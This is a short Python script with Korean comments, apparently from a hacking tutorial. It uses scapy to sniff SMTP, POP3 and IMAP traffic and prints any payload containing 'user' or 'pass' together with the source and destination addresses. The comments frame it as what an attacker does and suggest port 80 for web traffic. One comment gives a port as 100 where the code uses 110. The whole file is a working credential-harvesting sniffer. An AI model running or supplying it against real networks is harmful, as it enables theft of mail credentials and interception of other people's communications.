from scapy.all import *


def showPacket(packet):
    data = '%s' %(packet[TCP].payload)
    # ㄴ TCP헤더를 제외한 실제 메시지 추출
    if 'user' in data.lower() or 'pass' in data.lower():
        # ㄴ TCP를 통해 전송되는 메시지중 'user'나 'pass'라는 단어가 있으면
        print('+++[%s]\t[%s]:\t%s' %(packet[IP].src, packet[IP].dst, data))

def main(filter):
    sniff(filter = filter, prn = showPacket, count = 0, store = 0)


if __name__ == '__main__':
    print('---메일 스니핑 시작---')
    filter = 'tcp port 25 or tcp port 110 or tcp port 143'
    main(filter)


# 메일을 위한 프로토콜인 SMTP, POP3, IMAP은 각각 25, 110, 143 번 포트를 사용한다.
# 공격자는 TCP포트 중, 25, 100, 143 번 포트로 오고 가는 정보를 스니핑하여 분석
# 웹을 통해 오가는 정보만 추출하여 분석하고자 한다면 80 번 포트


